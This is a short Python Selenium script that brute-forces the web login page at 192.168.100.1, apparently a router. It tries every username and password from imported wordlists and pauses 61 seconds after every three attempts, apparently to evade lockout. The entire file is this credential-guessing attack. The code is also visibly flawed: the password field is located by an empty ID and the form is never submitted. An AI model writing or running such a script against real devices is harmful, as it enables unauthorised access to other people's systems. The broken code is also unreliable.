import user
import password
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
login = webdriver.Firefox()
login.get("https://192.168.100.1")
crack_user = login.find_element(By.ID,"txt_Username")
crack_password = login.find_element(By.ID,"")
stop = 0
for i_1 in user.f1:
    for i_2 in password.f1:
        if 3 == stop:
            stop = 0
            sleep(61)
            crack_user.clear()
            crack_user.send_keys(i_1)
            crack_password.clear()
            crack_password.send_keys(i_2)
            stop = stop + 1
            sleep(0.5)
        else:
            print(stop)
            crack_user.clear()
            crack_user.send_keys(i_1)
            crack_password.clear()
            crack_password.send_keys(i_2)
            stop = stop + 1
            sleep(0.5)